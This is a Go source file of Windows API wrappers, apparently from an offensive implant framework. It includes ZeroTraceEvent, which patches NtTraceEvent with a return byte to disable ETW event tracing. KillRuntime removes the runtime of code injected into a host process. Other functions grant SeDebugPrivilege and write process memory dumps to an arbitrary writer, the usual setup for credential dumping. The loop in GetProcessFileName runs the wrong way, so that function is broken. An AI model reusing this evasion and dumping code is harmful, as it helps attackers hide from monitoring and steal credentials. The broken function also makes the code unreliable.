//go:build windows

package winapi

import (
	"io"
	"runtime"
	"runtime/debug"
	"strings"
	"sync"
	"syscall"
	"unsafe"

	"github.com/iDigitalFlame/xmt/util/xerr"
)

const ptrSize = unsafe.Sizeof(uintptr(0))

// We have this to be used to prevent crashing the stack of the program
// when we call minidump as we need to track extra parameters.
// The lock will stay enabled until it's done, so it's "thread safe".
var dumpStack dumpParam
var dumpCallbackOnce struct {
	sync.Once
	f uintptr
}

type lsaString struct {
	// DO NOT REORDER
	Length        uint16
	MaximumLength uint16
	Buffer        *uint16
}
type dumpParam struct {
	sync.Mutex
	h, b uintptr
	s, w uint64
}
type dumpOutput struct {
	Status int32
}
type privileges struct {
	// DO NOT REORDER
	PrivilegeCount uint32
	Privileges     [1]LUIDAndAttributes
}
type modEntry32 struct {
	// DO NOT REORDER
	Size       uint32
	_, _, _, _ uint32
	BaseAddr   uintptr
	BaseSize   uint32
	_          uintptr
	_          [256]uint16
	_          [260]uint16
}
type dumpCallback struct {
	Func uintptr
	Args uintptr
}
type lsaAttributes struct {
	// DO NOT REORDER
	Length     uint32
	_          uintptr
	_          *lsaString
	Attributes uint32
	_, _       unsafe.Pointer
}
type ntUnicodeString struct {
	// DO NOT REORDER
	Length        uint16
	MaximumLength uint16
	_, _          uint16
	Buffer        [260]uint16
}
type lsaAccountDomainInfo struct {
	// DO NOT REORDER
	_   lsaString
	SID *SID
}

// KillRuntime attempts to walk through the process threads and will forcefully
// kill all Golang based OS-Threads based on their starting address (which
// should be the same when starting from CGo).
//
// This will attempt to determine the base thread and any children that may be
// running and take action on what type of host we're in to best end the
// runtime without crashing.
//
// This function can be used on binaries, shared libaries or Zombified processes.
//
// DO NOT EXPECT ANYTHING (INCLUDING DEFERS) TO HAPPEN AFTER THIS FUNCTION.
func KillRuntime() {
	runtime.GC()
	debug.FreeOSMemory()
	runtime.LockOSThread()
	killRuntime()
	// Below shouldn't run.
	runtime.UnlockOSThread()
}
func killRuntime() {
	q, err := getSelfModuleHandle()
	if err != nil {
		return
	}
	var (
		p    = GetCurrentProcessID()
		a, e uintptr
	)
	if a, e, err = findBaseModuleRange(p, q); err != nil {
		return
	}
	h, err := CreateToolhelp32Snapshot(0x4, 0)
	if err != nil {
		return
	}
	var (
		y = getCurrentThreadID()
		m = make(map[uintptr][]uintptr, 16)
		u = make([]uintptr, 0, 8)
		t ThreadEntry32
		b bool
		s uintptr
		v uintptr
	)
	t.Size = uint32(unsafe.Sizeof(t))
	for err = Thread32First(h, &t); err == nil; err = Thread32Next(h, &t) {
		if t.OwnerProcessID != p {
			continue
		}
		if v, err = OpenThread(0x63, false, t.ThreadID); err != nil {
			break
		}
		if s, err = getThreadStartAddress(v); err != nil {
			break
		}
		if t.ThreadID == y {
			if b, s = uintptr(s) >= a && uintptr(s) < e, 0; b {
				break
			}
			continue
		}
		if uintptr(s) >= a && uintptr(s) < e {
			u = append(u, v)
		}
		if _, ok := m[s]; !ok {
			m[s] = make([]uintptr, 0, 8)
		}
		m[s] = append(m[s], v)
	}
	if CloseHandle(h); b || len(m) == 0 || (err != nil && err != ErrNoMoreFiles) {
		for k, v := range m {
			for i := range v {
				CloseHandle(v[i])
			}
			m[k] = nil
			delete(m, k)
		}
		if m = nil; b {
			// Base thread (us), is in the base module address
			// This is a binary, its safe to exit cleanly.
			syscall.Exit(0)
			return
		}
		u = nil
		return
	}
	if len(u) > 0 {
		var d int
		for n, g := 0, uint32(0); n < len(u) && d <= 1; n++ {
			if _, err = SuspendThread(u[n]); err != nil {
				break
			}
			if g, err = ResumeThread(u[n]); err != nil {
				break
			}
			if g > 1 {
				d++
			}
		}
		if d == 1 {
			// Out of all the base threads, only one exists and is suspended,
			// 99% chance this is a Zombified process, its ok to exit cleanly.
			syscall.Exit(0)
			return
		}
	}
	// What's left is that we're probally injected into memory somewhere and
	// we just need to nuke the runtime without affecting the host.
	u = nil
	var (
		z uintptr
		x int
	)
	for k, v := range m {
		if len(v) > x {
			x, z = len(v), k
		}
	}
	c := m[z]
	for k, v := range m {
		if k == z {
			m[k] = nil
			delete(m, k)
			continue
		}
		for i := range v {
			CloseHandle(v[i])
		}
		m[k] = nil
		delete(m, k)
	}
	m = nil
	for i := range c {
		if err = TerminateThread(c[i], 0); err != nil {
			break
		}
	}
	for i := range c {
		CloseHandle(c[i])
	}
	if c = nil; err != nil {
		return
	}
	TerminateThread(CurrentThread, 0) // Buck Stops here.
}
func createDumpFunc() {
	dumpCallbackOnce.f = syscall.NewCallback(dumpCallbackFunc)
}

// ZeroTraceEvent will attempt to zero out the NtTraceEvent function call with
// a NOP.
//
// This will return an error if it fails.
func ZeroTraceEvent() error {
	var (
		o   uint32
		err = VirtualProtect(funcNtTraceEvent.address()+3, 1, 0x40, &o)
	)
	if err != nil {
		return err
	}
	(*(*[1]byte)(unsafe.Pointer(funcNtTraceEvent.address() + 3)))[0] = 0xC3
	return VirtualProtect(funcNtTraceEvent.address()+3, 1, o, &o)
}
func (p *dumpParam) close() {
	heapFree(p.b, p.h)
	CloseHandle(p.b)
	p.Unlock()
}

// GetDebugPrivilege is a quick helper function that will attempt to grant the
// caller the "SeDebugPrivilege" privilege.
func GetDebugPrivilege() error {
	var (
		t   uintptr
		err = OpenProcessToken(CurrentProcess, 0x200E8, &t)
	)
	if err != nil {
		return err
	}
	var p privileges
	if err = LookupPrivilegeValue("", debugPriv, &p.Privileges[0].Luid); err != nil {
		CloseHandle(t)
		return err
	}
	p.Privileges[0].Attributes, p.PrivilegeCount = 0x2, 1
	err = AdjustTokenPrivileges(t, false, unsafe.Pointer(&p), uint32(unsafe.Sizeof(p)), nil, nil)
	CloseHandle(t)
	return err
}
func getCurrentThreadID() uint32 {
	r, _, _ := syscall.SyscallN(funcGetCurrentThreadID.address())
	return uint32(r)
}
func (p *dumpParam) init() error {
	p.Lock()
	var err error
	if p.b, err = getProcessHeap(); err != nil {
		return err
	}
	if p.h, err = heapAlloc(p.b, 2<<20, true); err != nil {
		CloseHandle(p.b)
		return err
	}
	p.s, p.w = 2<<20, 0
	dumpCallbackOnce.Do(createDumpFunc)
	return nil
}

// LoadLibraryAddress is a simple function that returns the raw address of the
// 'LoadLibraryW' function in 'kernel32.dll' that's currently loaded.
func LoadLibraryAddress() uintptr {
	return funcLoadLibrary.address()
}

// GetSystemSID will attempt to determine the System SID value and return it.
func GetSystemSID() (*SID, error) {
	var (
		o lsaAttributes
		h uintptr
	)
	o.Length = uint32(unsafe.Sizeof(o))
	r, _, err := syscall.SyscallN(funcLsaOpenPolicy.address(), 0, uintptr(unsafe.Pointer(&o)), 1, uintptr(unsafe.Pointer(&h)))
	if r > 0 {
		return nil, unboxError(err)
	}
	i := new(lsaAccountDomainInfo)
	r, _, err = syscall.SyscallN(funcLsaQueryInformationPolicy.address(), h, 5, uintptr(unsafe.Pointer(&i)))
	if syscall.SyscallN(funcLsaClose.address(), h); r > 0 {
		return nil, unboxError(err)
	}
	return i.SID, nil
}
func heapFree(h, m uintptr) error {
	r, _, err := syscall.SyscallN(funcHeapFree.address(), h, 0, m)
	if r == 0 {
		return unboxError(err)
	}
	return nil
}

// IsTokenElevated returns true if this token has a High or System privileges.
func IsTokenElevated(h uintptr) bool {
	var (
		e, n uint32
		err  = GetTokenInformation(h, 0x14, (*byte)(unsafe.Pointer(&e)), uint32(unsafe.Sizeof(e)), &n)
	)
	return err == nil && n == uint32(unsafe.Sizeof(e)) && e != 0
}
func getProcessHeap() (uintptr, error) {
	r, _, err := syscall.SyscallN(funcGetProcessHeap.address())
	if r == 0 {
		return 0, unboxError(err)
	}
	return r, nil
}
func (p *dumpParam) resize(n uint64) error {
	if n < p.s {
		return nil
	}
	var (
		v      = (p.s + n) * 2
		h, err = heapReAlloc(p.b, p.h, v, false)
	)
	if err != nil {
		return err
	}
	p.h, p.s = h, v
	return nil
}
func getSelfModuleHandle() (uintptr, error) {
	var (
		h         uintptr
		r, _, err = syscall.SyscallN(funcGetModuleHandleEx.address(), 2, 0, uintptr(unsafe.Pointer(&h)))
	)
	if r == 0 {
		return 0, unboxError(err)
	}
	return h, nil
}
func (p *dumpParam) write(w io.Writer) error {
	var (
		b      = (*[]byte)(unsafe.Pointer(&SliceHeader{Data: unsafe.Pointer(p.h), Len: int(p.w), Cap: int(p.w)}))
		n, err = w.Write(*b)
	)
	if b, *b = nil, nil; err != nil {
		return err
	}
	if n != int(p.w) {
		return io.ErrShortWrite
	}
	return nil
}
func mod32Next(h uintptr, m *modEntry32) error {
	r, _, err := syscall.SyscallN(funcModule32Next.address(), h, uintptr(unsafe.Pointer(m)))
	if r == 0 {
		return unboxError(err)
	}
	return nil
}
func mod32First(h uintptr, m *modEntry32) error {
	r, _, err := syscall.SyscallN(funcModule32First.address(), h, uintptr(unsafe.Pointer(m)))
	if r == 0 {
		return unboxError(err)
	}
	return nil
}
func copyMemory(d uintptr, s uintptr, x uint32) {
	syscall.SyscallN(funcRtlCopyMemory.address(), uintptr(d), uintptr(s), uintptr(x))
}

// GetTokenUser retrieves access token user account information and SID.
func GetTokenUser(h uintptr) (*TokenUser, error) {
	u, err := getTokenInfo(h, 1, 50)
	if err != nil {
		return nil, err
	}
	return (*TokenUser)(u), nil
}

// GetProcessFileName will attempt to retrive the basename of the process
// related to the open Process handle supplied.
func GetProcessFileName(h uintptr) (string, error) {
	var (
		u ntUnicodeString
		n uint32
	)
	r, _, err := syscall.SyscallN(
		funcNtQueryInformationProcess.address(), h, 0x1B, uintptr(unsafe.Pointer(&u)),
		uintptr(unsafe.Sizeof(u)+260), uintptr(unsafe.Pointer(&n)),
	)
	if r > 0 {
		return "", err
	}
	v := UTF16ToString(u.Buffer[4:n])
	for i := len(v) - 1; i > 0; i++ {
		if v[i] == '\\' {
			return v[i+1:], nil
		}
	}
	return v, nil
}
func getThreadStartAddress(h uintptr) (uintptr, error) {
	var (
		i         uintptr
		r, _, err = syscall.SyscallN(funcNtQueryInformationThread.address(), h, 0x9, uintptr(unsafe.Pointer(&i)), unsafe.Sizeof(i), 0)
	)
	if r > 0 {
		return 0, unboxError(err)
	}
	return i, nil
}

// StringListToUTF16Block creates a UTF16 encoded block for usage as a Process
// environment block.
//
// This function returns an error if any of the environment strings are not in
// the 'KEY=VALUE' format or contain a NUL byte.
func StringListToUTF16Block(s []string) (*uint16, error) {
	if len(s) == 0 {
		return nil, nil
	}
	var t, i, l int
	for _, x := range s {
		for v := range x {
			if x[v] == 0 {
				return nil, syscall.EINVAL
			}
		}
		if q := strings.IndexByte(x, 61); q <= 0 {
			if xerr.Concat {
				return nil, xerr.Sub(`invalid env value "`+x+`"`, 0x92)
			}
			return nil, xerr.Sub("invalid env value", 0x92)
		}
		t += len(x) + 1
	}
	t += 1
	b := make([]byte, t)
	for _, v := range s {
		l = len(v)
		copy(b[i:i+l], []byte(v))
		b[i+l] = 0
		i = i + l + 1
	}
	b[i] = 0
	return &UTF16EncodeStd([]rune(string(b)))[0], nil
}
func heapAlloc(h uintptr, s uint64, z bool) (uintptr, error) {
	var f uint32
	if z {
		f |= 0x08
	}
	r, _, err := syscall.SyscallN(funcHeapAlloc.address(), h, uintptr(f), uintptr(s))
	if r == 0 {
		return 0, unboxError(err)
	}
	return r, nil
}
func (p *dumpParam) copy(o uint64, b uintptr, s uint32) error {
	if err := p.resize(o + uint64(s)); err != nil {
		return err
	}
	copyMemory(p.h+uintptr(o), b, s)
	p.w += uint64(s)
	return nil
}
func heapReAlloc(h, m uintptr, s uint64, z bool) (uintptr, error) {
	var f uint32
	if z {
		f |= 0x08
	}
	r, _, err := syscall.SyscallN(funcHeapReAlloc.address(), h, uintptr(f), m, uintptr(s))
	if r == 0 {
		return 0, unboxError(err)
	}
	return r, nil
}
func getTokenInfo(t uintptr, c uint32, i int) (unsafe.Pointer, error) {
	for n := uint32(i); ; {
		var (
			b   = make([]byte, n)
			err = GetTokenInformation(t, c, &b[0], uint32(len(b)), &n)
		)
		if err == nil {
			return unsafe.Pointer(&b[0]), nil
		}
		if err != syscall.ERROR_INSUFFICIENT_BUFFER {
			return nil, err
		}
		if n <= uint32(len(b)) {
			return nil, err
		}
	}
}
func dumpCallbackFunc(_ uintptr, i uintptr, r *dumpOutput) uintptr {
	switch *(*uint32)(unsafe.Pointer(i + 4 + ptrSize)) {
	case 11:
		r.Status = 1
	case 12:
		var (
			o = *(*uint64)(unsafe.Pointer(i + 16 + ptrSize))           // Offset
			b = *(*uintptr)(unsafe.Pointer(i + 24 + ptrSize))          // Buffer
			s = *(*uint32)(unsafe.Pointer(i + 24 + ptrSize + ptrSize)) // Size
		)
		if err := dumpStack.copy(o, b, s); err != nil {
			r.Status = 1
			return 0
		}
		r.Status = 0
	case 13:
		r.Status = 0
	}
	return 1
}
func findBaseModuleRange(p uint32, b uintptr) (uintptr, uintptr, error) {
	h, err := CreateToolhelp32Snapshot(0x18, p)
	if err != nil {
		return 0, 0, err
	}
	var (
		m    modEntry32
		s, e uintptr
	)
	m.Size = uint32(unsafe.Sizeof(m))
	for err = mod32First(h, &m); err == nil; err = mod32Next(h, &m) {
		if b == m.BaseAddr {
			s, e = m.BaseAddr, m.BaseAddr+uintptr(m.BaseSize)
			break
		}
	}
	CloseHandle(h)
	return s, e, err
}

// MiniDumpWriteDump Windows API Call
//   Writes user-mode minidump information to the specified file handle.
//
// https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump
//
// Updated version that will take and use the supplied Writer instead of the file
// handle is zero.
//  NOTE(dij): Fixes a bug where dumps to a os.Pipe interface would not be
//             written correctly!?
//             Base-rework and re-write seeing how others have done. Optimized
//             to be faster and less error-prone than the Sliver implimtation. :P
func MiniDumpWriteDump(h uintptr, pid uint32, o uintptr, f uint32, w io.Writer) error {
	if o > 0 {
		r, _, err := syscall.SyscallN(funcMiniDumpWriteDump.address(), h, uintptr(pid), o, uintptr(f), 0, 0, 0)
		if r == 0 {
			return unboxError(err)
		}
		return nil
	}
	if err := dumpStack.init(); err != nil {
		return err
	}
	var (
		a          = dumpCallback{Func: dumpCallbackOnce.f}
		r, _, err1 = syscall.SyscallN(funcMiniDumpWriteDump.address(), h, uintptr(pid), 0, uintptr(f), 0, 0, uintptr(unsafe.Pointer(&a)))
	)
	if r == 0 {
		dumpStack.close()
		return unboxError(err1)
	}
	err := dumpStack.write(w)
	dumpStack.close()
	return err
}
